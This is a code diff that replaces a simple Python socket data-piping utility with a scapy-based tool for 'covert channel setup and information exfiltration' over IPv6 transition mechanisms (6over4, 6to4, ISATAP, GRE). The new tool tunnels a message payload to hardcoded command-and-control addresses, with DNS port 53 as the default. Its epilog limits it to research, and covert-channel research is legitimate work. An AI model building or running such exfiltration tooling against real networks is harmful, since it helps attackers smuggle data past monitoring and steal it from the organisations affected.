@@ -1,252 +1,182 @@
-#!/usr/bin/python3 -tt
-# (C) Bernhards 'Lockout' Blumbergs 2015
-# Version 0.2
+#!/usr/bin/python -tt
+# (c) B.Blumbergs 2015
 
-import socket
-import sys
+from scapy.all import *
 import argparse
+from random import randint
 
+def getip(iface): #Rewrite to detect default interfce and its ipaddress
+    ipaddr = ""
+    for x in conf.route.routes:
+        if x[3] == iface:
+            ipaddr = x[4]
+            break
+    return ipaddr
 
-def send64(data, mode):
-    """
-    Send the specified data to the destination socket
-    over IPv6 and IPv4 interchangeably
-    """
-    version = 6     # Routine for IP version selection need here
+def a64(ipv4addr):
+    i = 0
+    ipv6addr = ""
+    octets = ipv4addr.split(".")
+    for octet in octets:
+        hexoctet = format(int(octet),"x")
+        if len(hexoctet)%2 != 0: hexoctet = "0" + hexoctet
+        ipv6addr += hexoctet
+        i += 1
+        if i == 2: ipv6addr += ":"
+    return ipv6addr
 
-    if version == 4:
-        host = args.host4
-    if version == 6:
-        host = args.host6
+def a6over4(ipv4addr, prefix = "2a02:", subnet = ":"):
+    # prefix 48b + subnet 16b + 0:0 32b + IPv4 32b
+    ipv6addr = prefix + subnet +  a64(ipv4addr)
+    return ipv6addr
 
-    if not args.udp and not args.tcp:
-        if args.verbose >= 2:
-            print("[*] Defaulting to UDP protocol")
-        args.udp = True
+def a6to4(ipv4addr, subnet = ":0b0b", interface = "::1"):
+    # 2002 16b + IPv4 32b + subnet 16b + interface 64b
+    ipv6addr = "2002:" + a64(ipv4addr) + subnet + interface
+    return ipv6addr
 
-    if args.udp:
-        if version == 4:
-            sock = socket.socket(
-                socket.AF_INET,         # IPv4
-                socket.SOCK_DGRAM)      # UDP socket
-        if version == 6:
-            sock = socket.socket(
-                socket.AF_INET6,        # IPv6
-                socket.SOCK_DGRAM)      # UDP socket
+def aISATAP(ipv4addr, unique = 1, group = 0, prefix = "2a02:", subnet = ":"):
+    # prefix 48b + subnet 16b + ug00:5efe 32b + IPv4
+    id = "0" + format(int("000000" + str(unique) + str(group), 2), "x") + "00:5efe:"
+    ipv6addr = prefix + subnet + id + a64(ipv4addr)
+    return ipv6addr
 
-        socket.SO_BINDTODEVICE = 25     # If not specified by the system
-
-        sock.setsockopt(
-            socket.SOL_SOCKET,
-            socket.SO_BINDTODEVICE,
-            args.interface.encode())
-
-        if args.verbose >= 1:
-            print("[*] UDP socket to {0}:{1} via {2}".format(
-                host, port, args.interface))
-
-        sock.sendto(data, (host, port))     # Send UDP datagram
-        if args.verbose >= 2:
-            print("[*] Buffer sent:", data)
-
-        sock.close()
-        return(True)                        # Send success
-
-    if args.tcp:
-        if version == 4:
-            sock = socket.socket(
-                socket.AF_INET,             # IPv4
-                socket.SOCK_STREAM)         # TCP socket
-        if version == 6:
-            sock = socket.socket(
-                socket.AF_INET6,            # IPv6
-                socket.SOCK_STREAM)         # TCP socket
-
-        socket.SO_BINDTODEVICE = 25     # If not specified by the system
-
-        sock.setsockopt(
-            socket.SOL_SOCKET,
-            socket.SO_BINDTODEVICE,
-            args.interface.encode())
-
-        if args.verbose >= 1:
-            print("[*] Connecting to TCP socket {0}:{1} via {2}".format(
-                host, port, args.interface))
-        sock.connect((host, port))
-        repl = sock.recv(1024)
-        if args.verbose >= 1:
-            print("[*] TCP socket connected")
-
-        sock.send(data)                     # Send TCP stream
-        repl = sock.recv(1024)
-        if args.verbose >= 2:
-            print("[*] Buffer sent:", data)
-
-        sock.close()
-        return(True)                        # Send success
-
-
-# Command line option parser
 parser = argparse.ArgumentParser(
-    usage="%(prog)s [-tulbh4h6piv]",
-    description="Pipe data over IPv4 and IPv6")
+        usage = '%(prog)s [transport layer protocol] [tunnel type] [IPv4 options] [IPv6 options] [options]',
+        description = 'Using IPv6 transition mechanisms for covert channel setup and information exfiltration',
+        epilog = 'Unauthorized use of the tool is prohibited! Only for research and academic purposes!')
 
-parser.add_argument(
-    '-t', '--tcp',
-    action="store_true",
-    help="Use TCP")
-
-parser.add_argument(
-    '-u', '--udp',
-    action="store_true",
-    help="Use UDP. Default")
-
-parser.add_argument(
-    '-l', '--listen',
-    action="store_true",
-    help="Listen mode")
-
-parser.add_argument(
-    '-b', '--buff',
-    type=int,
-    default=500,
-    help="Buffer size. Default: 500")
-
-parser.add_argument(
-    '-h4', '--host4',
-    type=str,
-    default="127.0.0.1",
-    help="Host IPv4 address. Default: 127.0.0.1")
-
-parser.add_argument(
-    '-h6', '--host6',
-    type=str,
-    default="::1",
-    help="Host IPv6 address. Default: ::1")
-
-parser.add_argument(
-    '-p', '--port',
-    type=int,
-    default=443,
-    help="Destination or listen port. Default = 443")
-
-parser.add_argument(
-    '-s', '--sport',
-    type=int,
-    default=443,
-    help="Source port. Default = 443")
-
-parser.add_argument(
-    '-i', '--interface',
-    type=str,
-    default="eth0",
-    help="Network interface")
-
-parser.add_argument(
-    '-v', '--verbose',
-    action="count",
-    default=0,
-    help="Increase verbosity")
+parser.add_argument('-T', '--tcp',
+        action = "store_true",
+        help = 'Use TCP for transport layer')
+parser.add_argument('-U', '--udp',
+        action = "store_true",
+        help = 'Use UDP for transport layer. Default')
+parser.add_argument('-S', '--sctp',
+        action = "store_true",
+        help = 'Use SCTP for transprt layer')
+parser.add_argument('-N', '--nonh6',
+        action = "store_true",
+        help = "Use no next header for IPv6")
+parser.add_argument('-tO', '--t6over4',
+        action = "store_true",
+        help = 'Emulate 6over4 tunneling. Default')
+parser.add_argument('-tT', '--t6to4',
+        action = "store_true",
+        help = 'Emulate 6to4 tunneling')
+parser.add_argument('-tI', '--isatap',
+        action = "store_true",
+        help = 'Emulate ISATAP tunneling')
+parser.add_argument('-G', '--gre',
+        action = "store_true",
+        help = 'Use GRE ecapsulation')
+parser.add_argument('-v', '--verbose',
+        action = "count",
+        help = 'Increase verbosity. 1: More information, 2: Debugging information')
+parser.add_argument('-i', '--interface',
+        default = 'eth0',
+        type = str,
+        help = 'Ethernet interface. Default: eth0')
+parser.add_argument('-s4', '--source4',
+        type = str,
+        help = 'Source IPv4 address. Default: host IPv4')
+parser.add_argument('-d4', '--destination4',
+        type = str,
+        help = 'Destination IPv4 address')
+parser.add_argument('-s6', '--source6',
+        type = str,
+        help = 'Source IPv6 address')
+parser.add_argument('-d6', '--destination6',
+        type = str,
+        help = 'Destination IPv6 address')
+parser.add_argument('-sp', '--srcport',
+        type = int,
+        default = 53,
+        help = 'Source port. Default: 53')
+parser.add_argument('-dp', '--dstport',
+        type = int,
+        default = 53,
+        help = 'Destination port. Default: 53')
+parser.add_argument('-m', '--message',
+        help = 'Message for exfiltration. Default: A*100')
+parser.add_argument('-c', '--count',
+        type = int,
+        default = 1,
+        help = "Count of send iterations. Default: 1")
+parser.add_argument('-r', '--relay',
+        action = "store_true",
+        help = "Use 6to4 relay.")
 
 args = parser.parse_args()
+if args.verbose == 2: print(args)
 
-# Program variables
-buffer_size = args.buff
-host4 = args.host4
-host6 = args.host6
-port = args.port
+cnc4 = "85.254.250.85"
+cnc6 = "2a02:500:3333:1:216:3eff:fe01:85"
+relay6to4 = "192.88.99.1"
 
-# Main routine
-if not args.listen:
-    if args.verbose >= 1:
-        print("[*] Client mode")
+if args.message:
+    payload = args.message
+else:
+    payload = "A"*100
 
-    buff = 0
-    read_data = b""
-    data = b""
-    while True:
-        read_data = sys.stdin.buffer.read(1)
-        if not read_data:                       # End of input or EOF
-            send64(data, 0)
-            break
-        data += read_data
-        buff += 1
-        if buff == buffer_size:
-            send64(data, 0)
-            buff = 0
-            data = b""
+eth = args.interface
+srcport = args.srcport
+dstport = args.dstport
 
-if args.listen:
-    if args.verbose >= 1:
-        print("[*] Listen mode")
+if args.source4:
+    srcip4 = args.source4
+else:
+    srcip4 = getip(eth)
 
-    if not args.udp and not args.tcp:
-        if args.verbose >= 2:
-            print("[*] Defaulting to UDP protocol")
-        args.udp = True
+if args.destination4:
+    dstip4 = args.destination4
+else:
+    if args.relay or args.t6to4:
+        dstip4 = relay6to4
+    else:
+        dstip4 = cnc4 #HARDCODED! Needs to be changed to error!
 
-    if args.udp:
-        sock64 = socket.socket(
-            socket.AF_INET6,                    # IPv6
-            socket.SOCK_DGRAM)                  # UDP
+if args.source6:
+    srcip6 = args.source6
+else:
+    if args.t6over4:
+        srcip6 = a6over4(srcip4)
+    elif args.t6to4:
+        srcip6 = a6to4(srcip4)
+    elif args.isatap:
+        srcip6 = aISATAP(srcip4)
+    else:
+        srcip6 = a6over4(srcip4)
 
-        socket.SO_BINDTODEVICE = 25             # If not specified by system
+if args.destination6:
+    destip6 = args.destination6
+else:
+    dstip6 = cnc6 #HARDCODED! Needs to be changed to error!
 
-        sock64.setsockopt(
-            socket.SOL_SOCKET,
-            socket.SO_BINDTODEVICE,
-            args.interface.encode())
+if args.verbose == 2: print(srcip4, srcport, dstip4, dstport, srcip6, dstip6)
 
-        sock64.bind(('::', port))               # Listen on both protocols
+if args.tcp:
+    if args.verbose >= 1: print("[*] Sending over TCP")
+    sequence = randint(1,64000)
+    packet = IP(proto=41,src=srcip4,dst=dstip4)/IPv6(src=srcip6,dst=dstip6)/TCP(sport=srcport,dport=dstport,seq=sequence)/Raw(payload)
+elif args.udp:
+    if args.verbose >= 1: print("[*] Sending over UDP")
+    packet = IP(proto=41,src=srcip4,dst=dstip4)/IPv6(src=srcip6,dst=dstip6)/UDP(sport=srcport,dport=dstport)/Raw(payload)
+elif args.sctp:
+    if args.verbose >= 1: print("[*] Sending over SCTP")
+    packet = IP(proto=41,src=srcip4,dst=dstip4)/IPv6(src=srcip6,dst=dstip6,nh=132)/SCTP(sport=srcport,dport=dstport)/Raw(payload)
+elif args.nonh6:
+    if args.verbose >= 1: print("[*] Sending with No Next Header IPv6")
+    packet = IP(proto=41,src=srcip4,dst=dstip4)/IPv6(src=srcip6,dst=dstip6,nh=59)/SCTP(sport=srcport,dport=dstport)/Raw(payload)
+else:
+    if args.verbose >= 1: print("[*] Sending over UDP")
+    packet = IP(proto=41,src=srcip4,dst=dstip4)/IPv6(src=srcip6,dst=dstip6)/UDP(sport=srcport,dport=dstport)/Raw(payload)
 
-        if args.verbose >= 2:
-            print(
-                "[*] Listening on {0} IPv4:'{1}' IPv6:'{2}' port:{3} protocol:UDP".format(
-                    args.interface, host4, host6, port))
+if args.gre:
+    if args.verbose >= 1: print("[*] Using GRE")
+    packet = IP(proto=47,src=srcip4,dst=dstip4)/GRE(proto=41)/packet[IP].payload
 
-        while True:
-            data64, addr64 = sock64.recvfrom(buffer_size)
 
-            if data64:
-                if args.verbose >= 2:
-                    print("[*] Received from {0}".format(addr64))
-                print(data64)
+if args.verbose == 2: ls(packet)
+send(packet, iface = eth, count = args.count)
 
-            if not data64:
-                break
-
-        sock64.close()
-
-    if args.tcp:
-        sock64 = socket.socket(
-            socket.AF_INET6,                    # IPv6
-            socket.SOCK_STREAM)                 # TCP
-
-        socket.SO_BINDTODEVICE = 25             # If not specified by system
-
-        sock64.setsockopt(
-            socket.SOL_SOCKET,
-            socket.SO_BINDTODEVICE,
-            args.interface.encode())
-
-        sock64.bind(('::', port))               # Listen on both protocols
-        sock64.listen(1)
-
-        if args.verbose >= 2:
-            print(
-                "[*] Listening on {0} IPv4:'{1}' IPv6:'{2}' port:{3} protocol:TCP".format(
-                    args.interface, host4, host6, port))
-
-        while True:
-            conn64, addr64 = sock64.accept()
-            data64 = conn64.recv(buffer_size)
-
-            if data64:
-                if args.verbose >= 2:
-                    print("[*] Received from {0}".format(addr64))
-                print(data64)
-
-            if not data64:
-                break
-
-        sock64.close()
